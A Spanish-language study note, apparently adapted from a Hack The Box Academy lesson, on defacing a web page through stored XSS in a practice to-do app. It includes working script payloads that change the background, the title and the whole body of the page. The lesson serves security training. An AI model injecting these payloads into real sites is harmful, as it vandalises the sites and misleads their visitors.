---
aliases:
tags:
  - asset/web-app
  - estado/incompleto
primary categories:
secondary categories:
tertiary categories:
linked:
---

## Defacement 

Ahora que entendemos los diferentes tipos de XSS y los distintos métodos para descubrir vulnerabilidades XSS en páginas web, podemos comenzar a aprender cómo explotarlas. Como mencionamos antes, el daño y el alcance de un ataque XSS dependen del tipo de XSS: uno **almacenado** es el más crítico, mientras que uno **DOM-based** es menos grave.

Uno de los ataques más comunes cuando existe un XSS almacenado es el **defacement** o desfiguración del sitio.
Esto significa **cambiar la apariencia de la web para cualquier persona que la visite**.

Es muy común que grupos de hackers desfiguren un sitio para demostrar que lograron comprometerlo, como cuando atacantes desfiguraron el sitio del **Servicio Nacional de Salud del Reino Unido (NHS)** en 2018. Estos ataques pueden tener un gran impacto en medios y afectar el valor de la empresa, especialmente bancos y firmas tecnológicas.

Aunque existen muchas vulnerabilidades que pueden usarse para lograr lo mismo, los **XSS almacenados** son de los más utilizados para ello.

---

## Elementos para el Defacement

Podemos usar JavaScript inyectado (mediante XSS) para que una página web se vea como queramos. Sin embargo, la mayoría de los defacements solo buscan dejar un mensaje simple (“los hackeamos”), así que no se suele buscar algo estéticamente elaborado.

Cuatro elementos HTML suelen usarse para cambiar el aspecto principal de una página:

* **Color de fondo** → `document.body.style.background`
* **Imagen de fondo** → `document.body.background`
* **Título de la página** → `document.title`
* **Texto de la página** → `DOM.innerHTML`

Podemos usar dos o tres de estos elementos para escribir un mensaje básico y eliminar el elemento vulnerable, haciendo más difícil restaurar rápidamente la página, como veremos a continuación.

---

## Cambiando el Fondo

Volvamos al ejercicio de XSS almacenado y usemos eso como base.

Para cambiar el fondo podemos usar un color o una imagen. La mayoría de los defacements usan un fondo oscuro, así que usaremos color:

```html
<script>document.body.style.background = "#141d2b"</script>
```

(Ese es el mismo color de fondo de Hack The Box. Podés usar cualquier otro valor hex o un color como `"black"`).

Una vez agregado el payload a la lista To-Do, el fondo cambia.

Esto persistirá al refrescar la página y será visible para cualquier visitante, ya que es un **XSS almacenado**.

También podemos usar una imagen como fondo:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Probalo para ver cómo queda.

---

## Cambiando el Título de la Página

Podemos cambiar el título “2Do” por cualquier texto usando:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

El título de la pestaña cambiará inmediatamente.

---

## Cambiando el Texto de la Página

Para cambiar el texto visible podemos usar varias funciones JavaScript.
Por ejemplo, para modificar un elemento HTML específico:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

Con jQuery:

```javascript
$("#todo").html('New Text');
```

Pero como los grupos de hacking suelen dejar un solo mensaje y nada más, vamos a **cambiar todo el contenido del body** usando:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Seleccionamos el `<body>` usando `document.getElementsByTagName('body')[0]`, y al reemplazarlo, cambiamos todo el contenido de la página.

Antes de hacerlo permanentemente, deberíamos preparar el HTML por separado.

Para el ejercicio, usaremos este HTML tomado de Hack The Box Academy:

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

Podemos probarlo localmente para ver cómo se ve.

Luego lo minificamos y lo integramos en nuestro payload final:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>
```

Una vez agregado, nuestra versión modificada pasa a ser parte permanente del código visto por los visitantes.

---

## Resultado del Defacement

Tras aplicar los tres payloads, logramos desfigurar la página exitosamente.

Si miramos el **código fuente**, veremos que:

* El código original sigue ahí.
* Nuestros scripts inyectados aparecen al final.

Ejemplo:

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

Esto ocurre porque el JavaScript inyectado modifica la página cuando se ejecuta, no cuando se carga el HTML original.
Si la inyección estuviera en el medio del documento, otros scripts podrían aparecer después y habría que ajustarlo.

Pero para un usuario normal, la página aparece completamente desfigurada con nuestro mensaje.

